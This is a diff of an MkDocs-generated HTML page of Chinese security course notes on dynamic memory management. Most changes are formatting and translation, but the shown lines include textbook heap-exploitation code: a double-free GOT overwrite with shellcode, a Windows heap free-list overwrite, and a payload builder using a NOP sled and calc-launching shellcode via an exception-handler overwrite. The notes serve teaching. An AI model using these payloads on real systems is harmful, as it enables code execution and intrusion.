@@ -9,9 +9,9 @@
 <meta content="Jason" name="author"/>
 <link href="https://note.jason0743.best/soft_security/memory-management.html" rel="canonical"/>
 <link href="../assets/images/favicon.png" rel="icon"/>
-<meta content="mkdocs-1.4.0, mkdocs-material-8.5.4" name="generator"/>
+<meta content="mkdocs-1.4.0, mkdocs-material-8.5.6" name="generator"/>
 <title>动态内存管理 - Jason的笔记小屋</title>
-<link href="../assets/stylesheets/main.80dcb947.min.css" rel="stylesheet"/>
+<link href="../assets/stylesheets/main.20d9efc8.min.css" rel="stylesheet"/>
 <link href="../assets/stylesheets/palette.cbb835fc.min.css" rel="stylesheet"/>
 <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
 <link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
@@ -30,7 +30,15 @@
 <meta content="动态内存管理 - Jason的笔记小屋" name="twitter:title"/>
 <meta content="信息安全、前端相关笔记存放处" name="twitter:description"/>
 <meta content="https://note.jason0743.best/assets/images/social/soft_security/memory-management.png" name="twitter:image"/>
-<link href="../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>html.glightbox-open { overflow: initial; height: 100%; }</style><script src="../assets/javascripts/glightbox.min.js"></script></head>
+<link href="../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gdesc-inner { font-size: 0.75rem; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            
+                .gscrollbar-fixer { padding-right: 15px; }
+                </style><script src="../assets/javascripts/glightbox.min.js"></script></head>
 <body data-md-color-accent="" data-md-color-primary="" data-md-color-scheme="default" dir="ltr">
 <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
 <input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
@@ -834,8 +842,8 @@
 <a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="p">}</span><span class="w"></span>
 </code></pre></div>
 <ol>
-<li>wrong</li>
-<li>ok - temp variable used</li>
+<li>错误的用法</li>
+<li>没问题——使用了临时变量</li>
 </ol>
 </li>
 <li>
@@ -851,7 +859,7 @@
 </span></code></pre></div></li>
 <li>数据结构包含指向同一项的链接
     <figure markdown="">
-<a class="glightbox" href="md-img/20191021_01.png"><img alt="pointer points the same structure" src="md-img/20191021_01.png"/></a>
+<a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_01.png"><img alt="pointer points the same structure" src="md-img/20191021_01.png"/></a>
 </figure><ul>
 <li>类似于<code>free(a-&gt;stru); free(b-&gt;stru);</code></li>
 </ul>
@@ -880,7 +888,7 @@
 </ol>
 <h3 id="dlmalloc">dlmalloc<a class="headerlink" href="#dlmalloc" title="Permanent link">¶</a></h3>
 <figure>
-<p><a class="glightbox" href="md-img/20191021_02.png"><img alt="chunks" src="md-img/20191021_02.png"/></a></p>
+<p><a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_02.png"><img alt="chunks" src="md-img/20191021_02.png"/></a></p>
 <figcaption>dlmalloc是大部分Linux版本默认内存分配器</figcaption>
 </figure>
 <ul>
@@ -916,7 +924,7 @@
 </ul>
 </li>
 <li>空闲块被组织成筐
-<a class="glightbox" href="md-img/20191021_03.png"><img alt="chunks2" src="md-img/20191021_03.png"/></a><ul>
+    <a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_03.png"><img alt="chunks2" src="md-img/20191021_03.png"/></a><ul>
 <li>由头索引</li>
 <li>筐中的块大约同样大小</li>
 <li>还有一个包含最近释放的块的筐作为缓存</li>
@@ -940,7 +948,7 @@
 <a href="#__codelineno-7-6" id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="cp">}</span>
 </code></pre></div></p>
 <p><figure markdown="">
-<a class="glightbox" href="md-img/20191021_04.png"><img alt="unlink示意" src="md-img/20191021_04.png"/></a>
+<a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_04.png"><img alt="unlink示意" src="md-img/20191021_04.png"/></a>
 <figcaption>unlink示意</figcaption>
 </figure></p>
 </li>
@@ -1064,8 +1072,8 @@
 <li>
 <p>bin structure</p>
 <p><figure markdown="">
-<a class="glightbox" href="md-img/20191021_05.png"><img alt="bin structure" loading="lazy" src="md-img/20191021_05.png" width="300"/></a>
-<a class="glightbox" href="md-img/20191021_06.png"><img alt="bin structure" loading="lazy" src="md-img/20191021_06.png" width="300"/></a>
+<a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_05.png"><img alt="bin structure" loading="lazy" src="md-img/20191021_05.png" width="300"/></a>
+<a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_06.png"><img alt="bin structure" loading="lazy" src="md-img/20191021_06.png" width="300"/></a>
 <figcaption>一般筐结构</figcaption>
 </figure></p>
 <ul>
@@ -1084,12 +1092,12 @@
 <li>
 <p>利用困难：已释放的内存没有立即放入筐中，而是被缓存；双重释放块可能和其他块合并</p>
 <p><figure markdown="">
-<a class="glightbox" href="md-img/20191021_07.png"><img alt="corrupted bin" loading="lazy" src="md-img/20191021_07.png" width="300"/></a>
+<a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_07.png"><img alt="corrupted bin" loading="lazy" src="md-img/20191021_07.png" width="300"/></a>
 <figcaption>损坏的筐结构</figcaption>
 </figure></p>
 <div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><a href="#__codelineno-11-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">GOT_LOCATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0804c98c</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-11-2" name="__codelineno-11-2"></a><a href="#__codelineno-11-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
-<a id="__codelineno-11-3" name="__codelineno-11-3"></a><a href="#__codelineno-11-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="s">"</span><span class="se">\xeb\x0c</span><span class="s">jump12chars_"</span><span class="w">   </span><span class="cm">/* jump */</span><span class="w"></span>
+<a id="__codelineno-11-3" name="__codelineno-11-3"></a><a href="#__codelineno-11-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="s">"</span><span class="se">\xeb\x0c</span><span class="s">jump12chars_"</span><span class="w"> </span><span class="cm">/* jump */</span><span class="w"></span>
 <a id="__codelineno-11-4" name="__codelineno-11-4"></a><a href="#__codelineno-11-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span><span class="w"></span>
 <a id="__codelineno-11-5" name="__codelineno-11-5"></a><a href="#__codelineno-11-5"><span class="linenos" data-linenos=" 5 "></span></a>
 <a id="__codelineno-11-6" name="__codelineno-11-6"></a><a href="#__codelineno-11-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="w"></span>
@@ -1187,7 +1195,7 @@
 <li>
 <p>边界标志
     <figure markdown="">
-<a class="glightbox" href="md-img/20191021_08.png"><img alt="块边界结构" src="md-img/20191021_08.png"/></a>
+<a class="glightbox" data-desc-position="bottom" data-description="" data-height="auto" data-title="" data-width="100%" href="md-img/20191021_08.png"><img alt="块边界结构" src="md-img/20191021_08.png"/></a>
 <figcaption>块边界结构</figcaption>
 </figure></p>
 <ul>
@@ -1211,19 +1219,19 @@
 <p>改写双链表结构中的前向和后向指针</p>
 <div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><a href="#__codelineno-12-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"</span><span class="se">\x90\x90\x90\x90</span><span class="s">"</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-12-2" name="__codelineno-12-2"></a><a href="#__codelineno-12-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">malArg</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"0123456789012345"</span><span class="w"></span>
-<a id="__codelineno-12-3" name="__codelineno-12-3"></a><a href="#__codelineno-12-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">            </span><span class="s">"</span><span class="se">\x05\x00\x03\x00\x00\x00\x08\x00</span><span class="s">"</span><span class="w">       </span>
+<a id="__codelineno-12-3" name="__codelineno-12-3"></a><a href="#__codelineno-12-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">            </span><span class="s">"</span><span class="se">\x05\x00\x03\x00\x00\x00\x08\x00</span><span class="s">"</span><span class="w"></span>
 <a id="__codelineno-12-4" name="__codelineno-12-4"></a><a href="#__codelineno-12-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">            </span><span class="s">"</span><span class="se">\xb8\xf5\x12\x00\x40\x90\x40\x00</span><span class="s">"</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-12-5" name="__codelineno-12-5"></a><a href="#__codelineno-12-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="kt">void</span><span class="w"> </span><span class="nf">mem</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
 <a id="__codelineno-12-6" name="__codelineno-12-6"></a><a href="#__codelineno-12-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-12-7" name="__codelineno-12-7"></a><a href="#__codelineno-12-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<a id="__codelineno-12-8" name="__codelineno-12-8"></a><span class="hll"><a href="#__codelineno-12-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
-</span><a id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="hll"><a href="#__codelineno-12-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-12-8" name="__codelineno-12-8"></a><span class="hll"><a href="#__codelineno-12-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="hll"><a href="#__codelineno-12-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
 </span><a id="__codelineno-12-10" name="__codelineno-12-10"></a><span class="hll"><a href="#__codelineno-12-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">128</span><span class="p">);</span><span class="w"></span>
-</span><a id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="hll"><a href="#__codelineno-12-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
-</span><a id="__codelineno-12-12" name="__codelineno-12-12"></a><span class="hll"><a href="#__codelineno-12-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">h2</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (1) */</span><span class="w"></span>
-</span><a id="__codelineno-12-13" name="__codelineno-12-13"></a><a href="#__codelineno-12-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">malArg</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">     </span><span class="c1">// (2)</span>
-<a id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="hll"><a href="#__codelineno-12-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">h4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">128</span><span class="p">);</span><span class="w"> </span><span class="c1">// (3)</span>
-</span><a id="__codelineno-12-15" name="__codelineno-12-15"></a><a href="#__codelineno-12-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="cm">/* (4) */</span><span class="w"></span>
+</span><a id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="hll"><a href="#__codelineno-12-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-12-12" name="__codelineno-12-12"></a><span class="hll"><a href="#__codelineno-12-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">h2</span><span class="p">);</span><span class="w"> </span><span class="c1">// (1)</span>
+</span><a id="__codelineno-12-13" name="__codelineno-12-13"></a><a href="#__codelineno-12-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">malArg</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">     </span><span class="c1">// (2)</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="hll"><a href="#__codelineno-12-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">h4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">128</span><span class="p">);</span><span class="w"> </span><span class="c1">// (3)</span>
+</span><a id="__codelineno-12-15" name="__codelineno-12-15"></a><a href="#__codelineno-12-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="c1">// (4)!</span>
 <a id="__codelineno-12-16" name="__codelineno-12-16"></a><a href="#__codelineno-12-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-12-17" name="__codelineno-12-17"></a><a href="#__codelineno-12-17"><span class="linenos" data-linenos="17 "></span></a><span class="p">}</span><span class="w"></span>
 <a id="__codelineno-12-18" name="__codelineno-12-18"></a><a href="#__codelineno-12-18"><span class="linenos" data-linenos="18 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="n">_TCHAR</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
@@ -1243,12 +1251,12 @@
 <p>通过覆写异常处理器地址获取控制，引发异常</p>
 <div class="highlight"><span class="filename">vuln.c</span><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mem</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
 <a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w">         </span>
+<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
 <a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w">    </span><span class="c1">// (1)</span>
 <a href="#__codelineno-13-5" id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hp</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
-<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">260</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (2) */</span><span class="w"></span>
+<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">260</span><span class="p">);</span><span class="w"> </span><span class="c1">// (2)</span>
 <a href="#__codelineno-13-7" id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="w">    </span><span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"> </span><span class="c1">// (3)</span>
-<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="w">    </span><span class="cm">/* (4) */</span><span class="w"></span>
+<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="w">    </span><span class="c1">// (4)!</span>
 <a href="#__codelineno-13-9" id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">260</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-10" id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"we never get here"</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-11" id="__codelineno-13-11" name="__codelineno-13-11"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
@@ -1260,7 +1268,7 @@
 <a href="#__codelineno-13-17" id="__codelineno-13-17" name="__codelineno-13-17"></a><span class="w">    </span><span class="n">mem</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-18" id="__codelineno-13-18" name="__codelineno-13-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
 <a href="#__codelineno-13-19" id="__codelineno-13-19" name="__codelineno-13-19"></a><span class="p">}</span><span class="w"></span>
-<a href="#__codelineno-13-20" id="__codelineno-13-20" name="__codelineno-13-20"></a><span class="cm">/* (5) */</span><span class="w"></span>
+<a href="#__codelineno-13-20" id="__codelineno-13-20" name="__codelineno-13-20"></a><span class="cm">/* (5)! */</span><span class="w"></span>
 <a href="#__codelineno-13-21" id="__codelineno-13-21" name="__codelineno-13-21"></a><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">1000</span><span class="p">]</span><span class="o">=</span><span class="s">""</span><span class="p">;</span><span class="w"></span>
 <a href="#__codelineno-13-22" id="__codelineno-13-22" name="__codelineno-13-22"></a><span class="kt">void</span><span class="w"> </span><span class="nf">buildMalArg</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
 <a href="#__codelineno-13-23" id="__codelineno-13-23" name="__codelineno-13-23"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
@@ -1269,11 +1277,11 @@
 <a href="#__codelineno-13-26" id="__codelineno-13-26" name="__codelineno-13-26"></a><span class="w">    </span><span class="n">systemAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetAddress</span><span class="p">(</span><span class="s">"msvcrt.dll"</span><span class="p">,</span><span class="s">"system"</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-27" id="__codelineno-13-27" name="__codelineno-13-27"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">66</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"DDDD"</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-28" id="__codelineno-13-28" name="__codelineno-13-28"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\xeb\x14</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
-<a href="#__codelineno-13-29" id="__codelineno-13-29" name="__codelineno-13-29"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x44\x44\x44\x44\x44\x44</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (6) */</span><span class="w"></span>
-<a href="#__codelineno-13-30" id="__codelineno-13-30" name="__codelineno-13-30"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x73\x68\x68\x08</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (7) */</span><span class="w"></span>
+<a href="#__codelineno-13-29" id="__codelineno-13-29" name="__codelineno-13-29"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x44\x44\x44\x44\x44\x44</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="c1">// (6)</span>
+<a href="#__codelineno-13-30" id="__codelineno-13-30" name="__codelineno-13-30"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x73\x68\x68\x08</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="c1">// (7)</span>
 <a href="#__codelineno-13-31" id="__codelineno-13-31" name="__codelineno-13-31"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x4c\x04\x5d\x7c</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-32" id="__codelineno-13-32" name="__codelineno-13-32"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">21</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
-<a href="#__codelineno-13-33" id="__codelineno-13-33" name="__codelineno-13-33"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (8) */</span><span class="w"></span>
+<a href="#__codelineno-13-33" id="__codelineno-13-33" name="__codelineno-13-33"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="c1">// (8)</span>
 <a href="#__codelineno-13-34" id="__codelineno-13-34" name="__codelineno-13-34"></a><span class="w">    </span><span class="n">fixupaddresses</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="w"> </span><span class="n">systemAddr</span><span class="p">);</span><span class="w"></span>
 <a href="#__codelineno-13-35" id="__codelineno-13-35" name="__codelineno-13-35"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">tmp</span><span class="p">);</span><span class="w"></span>
